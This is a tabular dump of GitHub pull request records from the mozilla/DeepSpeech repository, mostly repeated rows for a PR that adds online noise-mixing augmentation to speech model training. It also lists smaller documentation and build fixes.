1535,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2639,2639,Publish README/USING/TRAINING to readthedocs,Fixes #2581,lissyx,1645737,2020-01-08T09:03:52Z,COLLABORATOR,True,57,44,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4c7d5fb0e1b3e4ed4d929ed4fbb5dbbae7d1d8d6,"Publish README/USING/TRAINING to readthedocs

Fixes #2581"
1536,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2637,2637,Remove information about 16 kHz only support,Based on the discussion here: https://discourse.mozilla.org/t/inference-with-model-different-than-16khz/43217/17 models for data different than 16kHz can be trained and used with client now.,Jendker,14967831,2020-01-07T16:26:23Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7c5d37312ef5129b526c72ce932aeb13bb4d3753,"Remove information about 16 kHz only support

Based on the discussion here: https://discourse.mozilla.org/t/inference-with-model-different-than-16khz/43217/17 models for data different than 16kHz can be trained and used with client now."
1537,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2636,2636,Use /MT linker flag on Windows for C++ static linkage,Fixes #2606,lissyx,1645737,2020-01-07T11:04:12Z,COLLABORATOR,False,2,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f6b9c5f7cec0f74e8e75c149a7e7353bdac961ab,"Use /MD linker flag on Windows for C++ static linkage

Fixes #2606"
1538,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2630,2630,Ensure document vc_redist,Fixes #2606,lissyx,1645737,2020-01-03T16:03:51Z,COLLABORATOR,True,2,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,af8b64f3bcc65b0453c1d307c905b708de04c632,"Ensure document vc_redist

Fixes #2606"
1539,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2629,2629,fix axis inversion problem,"As #2560 mentioned, fix augmentation axis inversion problem",mychiux413,13641193,2020-01-03T03:19:54Z,CONTRIBUTOR,True,26,26,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6e2befacb2e5026e762e751d16a1f076e3767c0d,swap freq <-> time
1540,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2628,2628,Re-enable Markdown small README for Bintray hosting,,lissyx,1645737,2020-01-02T15:11:45Z,COLLABORATOR,True,1,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b90f80e7edabaac18401d971d9fa16cb8c704288,Re-enable Markdown small README for Bintray hosting
1541,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2626,2626,TRAINING.rst - Include exact command for getting mmap tool,Fixes #2619.,dabinat,18251622,2019-12-31T22:22:37Z,COLLABORATOR,True,5,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d1b8eaa4022d4837c8a92faabca70767d9e034f8,TRAINING.rst - Include exact command for getting mmap tool
1542,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2625,2625,Implements #2624 - SWC importer: CSV columns for article and speaker,X-DeepSpeech: NOBUILD,tilmankamp,5991088,2019-12-31T15:26:41Z,CONTRIBUTOR,True,32,13,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,259a60b7b1fd0ef348cebf1da446d221e8eafcf5,Implements #2624 - SWC importer: CSV columns for article and speaker
1543,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2622,2622,online mix noise audio data in training step,"Mixing noisy data into training file before runtime could cause data monotonicity, but mixing noisy data in runtime could cause very bad performance, if we read each noise audio to augment each training row. (Ex: for HDD disk, the duration of mixing one audio is almost 100 times slower than freq_time_mask does).

To reduce online mixing time, I use another tf.Dataset to cache noise audio array, then mix them to training data.

usage:
```
python -u DeepSpeech.py --noshow_progressbar \
  --train_files data/ldc93s1/ldc93s1.csv \
  --test_files data/ldc93s1/ldc93s1.csv \
  --train_batch_size 1 \
  --test_batch_size 1 \
  --n_hidden 200 \
  --epochs 200 \
  --checkpoint_dir <checkpoint_dir> \
  --audio_aug_mix_noise_walk_dirs <directory1-contains-wav-files>,<directory2-contains-wav-files>
```
- Just specify the noise file directory, the process will automatically walk through the whole directory recursively, and collect .wav files (but it doesn't checkout the sample rate).
- This program assume every volume of noise audio have been maximized, to save the calculation time of each speech/noise volume balance, it just simply divide speech audio with value between `0~-10 db`, and divide noise audio with value between `-25~-50 db`
- The augment time can be as fast as freq_time_mask
- `--audio_aug_mix_noise_walk_dirs` can set multi dirs with comma separated.

To manually adjust volume loudness suppression:
```
python -u DeepSpeech.py \
...
--audio_aug_mix_noise_max_noise_db -25 \
--audio_aug_mix_noise_min_noise_db -50 \
--audio_aug_mix_noise_max_audio_db 0 \
--audio_aug_mix_noise_min_audio_db -10 \
...
```
- If your noise files are pure non-speaker noise, my experience paramters is `--audio_aug_mix_noise_max_noise_db -15`, `--audio_aug_mix_noise_min_noise_db -25`
- If your noise files are from speakers, like cocktail party, my experience paramters is `--audio_aug_mix_noise_max_noise_db -30`, `--audio_aug_mix_noise_min_noise_db -50`, otherwise, the voice can have a chance to cover the main speaker's volume.
- If you want to cache audio array into local disk, set `--audio_aug_mix_noise_cache <your cache path>`, otherwise cache in memory.",mychiux413,13641193,2019-12-31T09:57:57Z,CONTRIBUTOR,False,577,33,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,681f4709eb86106a5d8c4f81d004bd40627f6f90,Remove comments check from alphabet
1544,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2622,2622,online mix noise audio data in training step,"Mixing noisy data into training file before runtime could cause data monotonicity, but mixing noisy data in runtime could cause very bad performance, if we read each noise audio to augment each training row. (Ex: for HDD disk, the duration of mixing one audio is almost 100 times slower than freq_time_mask does).

To reduce online mixing time, I use another tf.Dataset to cache noise audio array, then mix them to training data.

usage:
```
python -u DeepSpeech.py --noshow_progressbar \
  --train_files data/ldc93s1/ldc93s1.csv \
  --test_files data/ldc93s1/ldc93s1.csv \
  --train_batch_size 1 \
  --test_batch_size 1 \
  --n_hidden 200 \
  --epochs 200 \
  --checkpoint_dir <checkpoint_dir> \
  --audio_aug_mix_noise_walk_dirs <directory1-contains-wav-files>,<directory2-contains-wav-files>
```
- Just specify the noise file directory, the process will automatically walk through the whole directory recursively, and collect .wav files (but it doesn't checkout the sample rate).
- This program assume every volume of noise audio have been maximized, to save the calculation time of each speech/noise volume balance, it just simply divide speech audio with value between `0~-10 db`, and divide noise audio with value between `-25~-50 db`
- The augment time can be as fast as freq_time_mask
- `--audio_aug_mix_noise_walk_dirs` can set multi dirs with comma separated.

To manually adjust volume loudness suppression:
```
python -u DeepSpeech.py \
...
--audio_aug_mix_noise_max_noise_db -25 \
--audio_aug_mix_noise_min_noise_db -50 \
--audio_aug_mix_noise_max_audio_db 0 \
--audio_aug_mix_noise_min_audio_db -10 \
...
```
- If your noise files are pure non-speaker noise, my experience paramters is `--audio_aug_mix_noise_max_noise_db -15`, `--audio_aug_mix_noise_min_noise_db -25`
- If your noise files are from speakers, like cocktail party, my experience paramters is `--audio_aug_mix_noise_max_noise_db -30`, `--audio_aug_mix_noise_min_noise_db -50`, otherwise, the voice can have a chance to cover the main speaker's volume.
- If you want to cache audio array into local disk, set `--audio_aug_mix_noise_cache <your cache path>`, otherwise cache in memory.",mychiux413,13641193,2019-12-31T09:57:57Z,CONTRIBUTOR,False,577,33,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,421243d2841a86c7a3f0fbea5d4f4d49ab82f706,Remove sort from feeding
1545,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2622,2622,online mix noise audio data in training step,"Mixing noisy data into training file before runtime could cause data monotonicity, but mixing noisy data in runtime could cause very bad performance, if we read each noise audio to augment each training row. (Ex: for HDD disk, the duration of mixing one audio is almost 100 times slower than freq_time_mask does).

To reduce online mixing time, I use another tf.Dataset to cache noise audio array, then mix them to training data.

usage:
```
python -u DeepSpeech.py --noshow_progressbar \
  --train_files data/ldc93s1/ldc93s1.csv \
  --test_files data/ldc93s1/ldc93s1.csv \
  --train_batch_size 1 \
  --test_batch_size 1 \
  --n_hidden 200 \
  --epochs 200 \
  --checkpoint_dir <checkpoint_dir> \
  --audio_aug_mix_noise_walk_dirs <directory1-contains-wav-files>,<directory2-contains-wav-files>
```
- Just specify the noise file directory, the process will automatically walk through the whole directory recursively, and collect .wav files (but it doesn't checkout the sample rate).
- This program assume every volume of noise audio have been maximized, to save the calculation time of each speech/noise volume balance, it just simply divide speech audio with value between `0~-10 db`, and divide noise audio with value between `-25~-50 db`
- The augment time can be as fast as freq_time_mask
- `--audio_aug_mix_noise_walk_dirs` can set multi dirs with comma separated.

To manually adjust volume loudness suppression:
```
python -u DeepSpeech.py \
...
--audio_aug_mix_noise_max_noise_db -25 \
--audio_aug_mix_noise_min_noise_db -50 \
--audio_aug_mix_noise_max_audio_db 0 \
--audio_aug_mix_noise_min_audio_db -10 \
...
```
- If your noise files are pure non-speaker noise, my experience paramters is `--audio_aug_mix_noise_max_noise_db -15`, `--audio_aug_mix_noise_min_noise_db -25`
- If your noise files are from speakers, like cocktail party, my experience paramters is `--audio_aug_mix_noise_max_noise_db -30`, `--audio_aug_mix_noise_min_noise_db -50`, otherwise, the voice can have a chance to cover the main speaker's volume.
- If you want to cache audio array into local disk, set `--audio_aug_mix_noise_cache <your cache path>`, otherwise cache in memory.",mychiux413,13641193,2019-12-31T09:57:57Z,CONTRIBUTOR,False,577,33,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d08efad480d160a8bd5ff94568a26abb57fbc760,Remove sort from evaluate tools
1546,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2622,2622,online mix noise audio data in training step,"Mixing noisy data into training file before runtime could cause data monotonicity, but mixing noisy data in runtime could cause very bad performance, if we read each noise audio to augment each training row. (Ex: for HDD disk, the duration of mixing one audio is almost 100 times slower than freq_time_mask does).

To reduce online mixing time, I use another tf.Dataset to cache noise audio array, then mix them to training data.

usage:
```
python -u DeepSpeech.py --noshow_progressbar \
  --train_files data/ldc93s1/ldc93s1.csv \
  --test_files data/ldc93s1/ldc93s1.csv \
  --train_batch_size 1 \
  --test_batch_size 1 \
  --n_hidden 200 \
  --epochs 200 \
  --checkpoint_dir <checkpoint_dir> \
  --audio_aug_mix_noise_walk_dirs <directory1-contains-wav-files>,<directory2-contains-wav-files>
```
- Just specify the noise file directory, the process will automatically walk through the whole directory recursively, and collect .wav files (but it doesn't checkout the sample rate).
- This program assume every volume of noise audio have been maximized, to save the calculation time of each speech/noise volume balance, it just simply divide speech audio with value between `0~-10 db`, and divide noise audio with value between `-25~-50 db`
- The augment time can be as fast as freq_time_mask
- `--audio_aug_mix_noise_walk_dirs` can set multi dirs with comma separated.

To manually adjust volume loudness suppression:
```
python -u DeepSpeech.py \
...
--audio_aug_mix_noise_max_noise_db -25 \
--audio_aug_mix_noise_min_noise_db -50 \
--audio_aug_mix_noise_max_audio_db 0 \
--audio_aug_mix_noise_min_audio_db -10 \
...
```
- If your noise files are pure non-speaker noise, my experience paramters is `--audio_aug_mix_noise_max_noise_db -15`, `--audio_aug_mix_noise_min_noise_db -25`
- If your noise files are from speakers, like cocktail party, my experience paramters is `--audio_aug_mix_noise_max_noise_db -30`, `--audio_aug_mix_noise_min_noise_db -50`, otherwise, the voice can have a chance to cover the main speaker's volume.
- If you want to cache audio array into local disk, set `--audio_aug_mix_noise_cache <your cache path>`, otherwise cache in memory.",mychiux413,13641193,2019-12-31T09:57:57Z,CONTRIBUTOR,False,577,33,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b0a14b5cea7f6b3b98730e5ce1e94b94ee0e67b9,"Merge pull request #1 from carlfm01/master

Update upstream"
1547,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2622,2622,online mix noise audio data in training step,"Mixing noisy data into training file before runtime could cause data monotonicity, but mixing noisy data in runtime could cause very bad performance, if we read each noise audio to augment each training row. (Ex: for HDD disk, the duration of mixing one audio is almost 100 times slower than freq_time_mask does).

To reduce online mixing time, I use another tf.Dataset to cache noise audio array, then mix them to training data.

usage:
```
python -u DeepSpeech.py --noshow_progressbar \
  --train_files data/ldc93s1/ldc93s1.csv \
  --test_files data/ldc93s1/ldc93s1.csv \
  --train_batch_size 1 \
  --test_batch_size 1 \
  --n_hidden 200 \
  --epochs 200 \
  --checkpoint_dir <checkpoint_dir> \
  --audio_aug_mix_noise_walk_dirs <directory1-contains-wav-files>,<directory2-contains-wav-files>
```
- Just specify the noise file directory, the process will automatically walk through the whole directory recursively, and collect .wav files (but it doesn't checkout the sample rate).
- This program assume every volume of noise audio have been maximized, to save the calculation time of each speech/noise volume balance, it just simply divide speech audio with value between `0~-10 db`, and divide noise audio with value between `-25~-50 db`
- The augment time can be as fast as freq_time_mask
- `--audio_aug_mix_noise_walk_dirs` can set multi dirs with comma separated.

To manually adjust volume loudness suppression:
```
python -u DeepSpeech.py \
...
--audio_aug_mix_noise_max_noise_db -25 \
--audio_aug_mix_noise_min_noise_db -50 \
--audio_aug_mix_noise_max_audio_db 0 \
--audio_aug_mix_noise_min_audio_db -10 \
...
```
- If your noise files are pure non-speaker noise, my experience paramters is `--audio_aug_mix_noise_max_noise_db -15`, `--audio_aug_mix_noise_min_noise_db -25`
- If your noise files are from speakers, like cocktail party, my experience paramters is `--audio_aug_mix_noise_max_noise_db -30`, `--audio_aug_mix_noise_min_noise_db -50`, otherwise, the voice can have a chance to cover the main speaker's volume.
- If you want to cache audio array into local disk, set `--audio_aug_mix_noise_cache <your cache path>`, otherwise cache in memory.",mychiux413,13641193,2019-12-31T09:57:57Z,CONTRIBUTOR,False,577,33,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ba1a58763e1b18720b2a8602d92c823327e0dd09,Remove TF dependency
1548,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2622,2622,online mix noise audio data in training step,"Mixing noisy data into training file before runtime could cause data monotonicity, but mixing noisy data in runtime could cause very bad performance, if we read each noise audio to augment each training row. (Ex: for HDD disk, the duration of mixing one audio is almost 100 times slower than freq_time_mask does).

To reduce online mixing time, I use another tf.Dataset to cache noise audio array, then mix them to training data.

usage:
```
python -u DeepSpeech.py --noshow_progressbar \
  --train_files data/ldc93s1/ldc93s1.csv \
  --test_files data/ldc93s1/ldc93s1.csv \
  --train_batch_size 1 \
  --test_batch_size 1 \
  --n_hidden 200 \
  --epochs 200 \
  --checkpoint_dir <checkpoint_dir> \
  --audio_aug_mix_noise_walk_dirs <directory1-contains-wav-files>,<directory2-contains-wav-files>
```
- Just specify the noise file directory, the process will automatically walk through the whole directory recursively, and collect .wav files (but it doesn't checkout the sample rate).
- This program assume every volume of noise audio have been maximized, to save the calculation time of each speech/noise volume balance, it just simply divide speech audio with value between `0~-10 db`, and divide noise audio with value between `-25~-50 db`
- The augment time can be as fast as freq_time_mask
- `--audio_aug_mix_noise_walk_dirs` can set multi dirs with comma separated.

To manually adjust volume loudness suppression:
```
python -u DeepSpeech.py \
...
--audio_aug_mix_noise_max_noise_db -25 \
--audio_aug_mix_noise_min_noise_db -50 \
--audio_aug_mix_noise_max_audio_db 0 \
--audio_aug_mix_noise_min_audio_db -10 \
...
```
- If your noise files are pure non-speaker noise, my experience paramters is `--audio_aug_mix_noise_max_noise_db -15`, `--audio_aug_mix_noise_min_noise_db -25`
- If your noise files are from speakers, like cocktail party, my experience paramters is `--audio_aug_mix_noise_max_noise_db -30`, `--audio_aug_mix_noise_min_noise_db -50`, otherwise, the voice can have a chance to cover the main speaker's volume.
- If you want to cache audio array into local disk, set `--audio_aug_mix_noise_cache <your cache path>`, otherwise cache in memory.",mychiux413,13641193,2019-12-31T09:57:57Z,CONTRIBUTOR,False,577,33,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,aebd08df4f80e05a53400f503c1fe533a107ca23,[ADD] mix noise audio
1549,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2622,2622,online mix noise audio data in training step,"Mixing noisy data into training file before runtime could cause data monotonicity, but mixing noisy data in runtime could cause very bad performance, if we read each noise audio to augment each training row. (Ex: for HDD disk, the duration of mixing one audio is almost 100 times slower than freq_time_mask does).

To reduce online mixing time, I use another tf.Dataset to cache noise audio array, then mix them to training data.

usage:
```
python -u DeepSpeech.py --noshow_progressbar \
  --train_files data/ldc93s1/ldc93s1.csv \
  --test_files data/ldc93s1/ldc93s1.csv \
  --train_batch_size 1 \
  --test_batch_size 1 \
  --n_hidden 200 \
  --epochs 200 \
  --checkpoint_dir <checkpoint_dir> \
  --audio_aug_mix_noise_walk_dirs <directory1-contains-wav-files>,<directory2-contains-wav-files>
```
- Just specify the noise file directory, the process will automatically walk through the whole directory recursively, and collect .wav files (but it doesn't checkout the sample rate).
- This program assume every volume of noise audio have been maximized, to save the calculation time of each speech/noise volume balance, it just simply divide speech audio with value between `0~-10 db`, and divide noise audio with value between `-25~-50 db`
- The augment time can be as fast as freq_time_mask
- `--audio_aug_mix_noise_walk_dirs` can set multi dirs with comma separated.

To manually adjust volume loudness suppression:
```
python -u DeepSpeech.py \
...
--audio_aug_mix_noise_max_noise_db -25 \
--audio_aug_mix_noise_min_noise_db -50 \
--audio_aug_mix_noise_max_audio_db 0 \
--audio_aug_mix_noise_min_audio_db -10 \
...
```
- If your noise files are pure non-speaker noise, my experience paramters is `--audio_aug_mix_noise_max_noise_db -15`, `--audio_aug_mix_noise_min_noise_db -25`
- If your noise files are from speakers, like cocktail party, my experience paramters is `--audio_aug_mix_noise_max_noise_db -30`, `--audio_aug_mix_noise_min_noise_db -50`, otherwise, the voice can have a chance to cover the main speaker's volume.
- If you want to cache audio array into local disk, set `--audio_aug_mix_noise_cache <your cache path>`, otherwise cache in memory.",mychiux413,13641193,2019-12-31T09:57:57Z,CONTRIBUTOR,False,577,33,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d255c3f952036fd6153ac6ee20a4c526ba98370a,[FIX] add missing file decoded_augmentation.py
1550,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2622,2622,online mix noise audio data in training step,"Mixing noisy data into training file before runtime could cause data monotonicity, but mixing noisy data in runtime could cause very bad performance, if we read each noise audio to augment each training row. (Ex: for HDD disk, the duration of mixing one audio is almost 100 times slower than freq_time_mask does).

To reduce online mixing time, I use another tf.Dataset to cache noise audio array, then mix them to training data.

usage:
```
python -u DeepSpeech.py --noshow_progressbar \
  --train_files data/ldc93s1/ldc93s1.csv \
  --test_files data/ldc93s1/ldc93s1.csv \
  --train_batch_size 1 \
  --test_batch_size 1 \
  --n_hidden 200 \
  --epochs 200 \
  --checkpoint_dir <checkpoint_dir> \
  --audio_aug_mix_noise_walk_dirs <directory1-contains-wav-files>,<directory2-contains-wav-files>
```
- Just specify the noise file directory, the process will automatically walk through the whole directory recursively, and collect .wav files (but it doesn't checkout the sample rate).
- This program assume every volume of noise audio have been maximized, to save the calculation time of each speech/noise volume balance, it just simply divide speech audio with value between `0~-10 db`, and divide noise audio with value between `-25~-50 db`
- The augment time can be as fast as freq_time_mask
- `--audio_aug_mix_noise_walk_dirs` can set multi dirs with comma separated.

To manually adjust volume loudness suppression:
```
python -u DeepSpeech.py \
...
--audio_aug_mix_noise_max_noise_db -25 \
--audio_aug_mix_noise_min_noise_db -50 \
--audio_aug_mix_noise_max_audio_db 0 \
--audio_aug_mix_noise_min_audio_db -10 \
...
```
- If your noise files are pure non-speaker noise, my experience paramters is `--audio_aug_mix_noise_max_noise_db -15`, `--audio_aug_mix_noise_min_noise_db -25`
- If your noise files are from speakers, like cocktail party, my experience paramters is `--audio_aug_mix_noise_max_noise_db -30`, `--audio_aug_mix_noise_min_noise_db -50`, otherwise, the voice can have a chance to cover the main speaker's volume.
- If you want to cache audio array into local disk, set `--audio_aug_mix_noise_cache <your cache path>`, otherwise cache in memory.",mychiux413,13641193,2019-12-31T09:57:57Z,CONTRIBUTOR,False,577,33,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ec251367bd012fce533c2ab30f9c8fce8f81ca80,"mix noise works, but performance is bad"
1551,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2622,2622,online mix noise audio data in training step,"Mixing noisy data into training file before runtime could cause data monotonicity, but mixing noisy data in runtime could cause very bad performance, if we read each noise audio to augment each training row. (Ex: for HDD disk, the duration of mixing one audio is almost 100 times slower than freq_time_mask does).

To reduce online mixing time, I use another tf.Dataset to cache noise audio array, then mix them to training data.

usage:
```
python -u DeepSpeech.py --noshow_progressbar \
  --train_files data/ldc93s1/ldc93s1.csv \
  --test_files data/ldc93s1/ldc93s1.csv \
  --train_batch_size 1 \
  --test_batch_size 1 \
  --n_hidden 200 \
  --epochs 200 \
  --checkpoint_dir <checkpoint_dir> \
  --audio_aug_mix_noise_walk_dirs <directory1-contains-wav-files>,<directory2-contains-wav-files>
```
- Just specify the noise file directory, the process will automatically walk through the whole directory recursively, and collect .wav files (but it doesn't checkout the sample rate).
- This program assume every volume of noise audio have been maximized, to save the calculation time of each speech/noise volume balance, it just simply divide speech audio with value between `0~-10 db`, and divide noise audio with value between `-25~-50 db`
- The augment time can be as fast as freq_time_mask
- `--audio_aug_mix_noise_walk_dirs` can set multi dirs with comma separated.

To manually adjust volume loudness suppression:
```
python -u DeepSpeech.py \
...
--audio_aug_mix_noise_max_noise_db -25 \
--audio_aug_mix_noise_min_noise_db -50 \
--audio_aug_mix_noise_max_audio_db 0 \
--audio_aug_mix_noise_min_audio_db -10 \
...
```
- If your noise files are pure non-speaker noise, my experience paramters is `--audio_aug_mix_noise_max_noise_db -15`, `--audio_aug_mix_noise_min_noise_db -25`
- If your noise files are from speakers, like cocktail party, my experience paramters is `--audio_aug_mix_noise_max_noise_db -30`, `--audio_aug_mix_noise_min_noise_db -50`, otherwise, the voice can have a chance to cover the main speaker's volume.
- If you want to cache audio array into local disk, set `--audio_aug_mix_noise_cache <your cache path>`, otherwise cache in memory.",mychiux413,13641193,2019-12-31T09:57:57Z,CONTRIBUTOR,False,577,33,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,484134eb9e303dea22358a15930277675c0a2f7c,[MOD] use tf.Dataset to cache noise audio
1552,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2622,2622,online mix noise audio data in training step,"Mixing noisy data into training file before runtime could cause data monotonicity, but mixing noisy data in runtime could cause very bad performance, if we read each noise audio to augment each training row. (Ex: for HDD disk, the duration of mixing one audio is almost 100 times slower than freq_time_mask does).

To reduce online mixing time, I use another tf.Dataset to cache noise audio array, then mix them to training data.

usage:
```
python -u DeepSpeech.py --noshow_progressbar \
  --train_files data/ldc93s1/ldc93s1.csv \
  --test_files data/ldc93s1/ldc93s1.csv \
  --train_batch_size 1 \
  --test_batch_size 1 \
  --n_hidden 200 \
  --epochs 200 \
  --checkpoint_dir <checkpoint_dir> \
  --audio_aug_mix_noise_walk_dirs <directory1-contains-wav-files>,<directory2-contains-wav-files>
```
- Just specify the noise file directory, the process will automatically walk through the whole directory recursively, and collect .wav files (but it doesn't checkout the sample rate).
- This program assume every volume of noise audio have been maximized, to save the calculation time of each speech/noise volume balance, it just simply divide speech audio with value between `0~-10 db`, and divide noise audio with value between `-25~-50 db`
- The augment time can be as fast as freq_time_mask
- `--audio_aug_mix_noise_walk_dirs` can set multi dirs with comma separated.

To manually adjust volume loudness suppression:
```
python -u DeepSpeech.py \
...
--audio_aug_mix_noise_max_noise_db -25 \
--audio_aug_mix_noise_min_noise_db -50 \
--audio_aug_mix_noise_max_audio_db 0 \
--audio_aug_mix_noise_min_audio_db -10 \
...
```
- If your noise files are pure non-speaker noise, my experience paramters is `--audio_aug_mix_noise_max_noise_db -15`, `--audio_aug_mix_noise_min_noise_db -25`
- If your noise files are from speakers, like cocktail party, my experience paramters is `--audio_aug_mix_noise_max_noise_db -30`, `--audio_aug_mix_noise_min_noise_db -50`, otherwise, the voice can have a chance to cover the main speaker's volume.
- If you want to cache audio array into local disk, set `--audio_aug_mix_noise_cache <your cache path>`, otherwise cache in memory.",mychiux413,13641193,2019-12-31T09:57:57Z,CONTRIBUTOR,False,577,33,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4f24f08f09611226d37347216acbd0af2d485f4a,rename decoded -> audio
1553,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2622,2622,online mix noise audio data in training step,"Mixing noisy data into training file before runtime could cause data monotonicity, but mixing noisy data in runtime could cause very bad performance, if we read each noise audio to augment each training row. (Ex: for HDD disk, the duration of mixing one audio is almost 100 times slower than freq_time_mask does).

To reduce online mixing time, I use another tf.Dataset to cache noise audio array, then mix them to training data.

usage:
```
python -u DeepSpeech.py --noshow_progressbar \
  --train_files data/ldc93s1/ldc93s1.csv \
  --test_files data/ldc93s1/ldc93s1.csv \
  --train_batch_size 1 \
  --test_batch_size 1 \
  --n_hidden 200 \
  --epochs 200 \
  --checkpoint_dir <checkpoint_dir> \
  --audio_aug_mix_noise_walk_dirs <directory1-contains-wav-files>,<directory2-contains-wav-files>
```
- Just specify the noise file directory, the process will automatically walk through the whole directory recursively, and collect .wav files (but it doesn't checkout the sample rate).
- This program assume every volume of noise audio have been maximized, to save the calculation time of each speech/noise volume balance, it just simply divide speech audio with value between `0~-10 db`, and divide noise audio with value between `-25~-50 db`
- The augment time can be as fast as freq_time_mask
- `--audio_aug_mix_noise_walk_dirs` can set multi dirs with comma separated.

To manually adjust volume loudness suppression:
```
python -u DeepSpeech.py \
...
--audio_aug_mix_noise_max_noise_db -25 \
--audio_aug_mix_noise_min_noise_db -50 \
--audio_aug_mix_noise_max_audio_db 0 \
--audio_aug_mix_noise_min_audio_db -10 \
...
```
- If your noise files are pure non-speaker noise, my experience paramters is `--audio_aug_mix_noise_max_noise_db -15`, `--audio_aug_mix_noise_min_noise_db -25`
- If your noise files are from speakers, like cocktail party, my experience paramters is `--audio_aug_mix_noise_max_noise_db -30`, `--audio_aug_mix_noise_min_noise_db -50`, otherwise, the voice can have a chance to cover the main speaker's volume.
- If you want to cache audio array into local disk, set `--audio_aug_mix_noise_cache <your cache path>`, otherwise cache in memory.",mychiux413,13641193,2019-12-31T09:57:57Z,CONTRIBUTOR,False,577,33,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1f57ece8ba65ea7b13c52dce577d95478416b12b,[FIX] don't create tf.Dataset in other tf.Dataset's pipeline
1554,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2622,2622,online mix noise audio data in training step,"Mixing noisy data into training file before runtime could cause data monotonicity, but mixing noisy data in runtime could cause very bad performance, if we read each noise audio to augment each training row. (Ex: for HDD disk, the duration of mixing one audio is almost 100 times slower than freq_time_mask does).

To reduce online mixing time, I use another tf.Dataset to cache noise audio array, then mix them to training data.

usage:
```
python -u DeepSpeech.py --noshow_progressbar \
  --train_files data/ldc93s1/ldc93s1.csv \
  --test_files data/ldc93s1/ldc93s1.csv \
  --train_batch_size 1 \
  --test_batch_size 1 \
  --n_hidden 200 \
  --epochs 200 \
  --checkpoint_dir <checkpoint_dir> \
  --audio_aug_mix_noise_walk_dirs <directory1-contains-wav-files>,<directory2-contains-wav-files>
```
- Just specify the noise file directory, the process will automatically walk through the whole directory recursively, and collect .wav files (but it doesn't checkout the sample rate).
- This program assume every volume of noise audio have been maximized, to save the calculation time of each speech/noise volume balance, it just simply divide speech audio with value between `0~-10 db`, and divide noise audio with value between `-25~-50 db`
- The augment time can be as fast as freq_time_mask
- `--audio_aug_mix_noise_walk_dirs` can set multi dirs with comma separated.

To manually adjust volume loudness suppression:
```
python -u DeepSpeech.py \
...
--audio_aug_mix_noise_max_noise_db -25 \
--audio_aug_mix_noise_min_noise_db -50 \
--audio_aug_mix_noise_max_audio_db 0 \
--audio_aug_mix_noise_min_audio_db -10 \
...
```
- If your noise files are pure non-speaker noise, my experience paramters is `--audio_aug_mix_noise_max_noise_db -15`, `--audio_aug_mix_noise_min_noise_db -25`
- If your noise files are from speakers, like cocktail party, my experience paramters is `--audio_aug_mix_noise_max_noise_db -30`, `--audio_aug_mix_noise_min_noise_db -50`, otherwise, the voice can have a chance to cover the main speaker's volume.
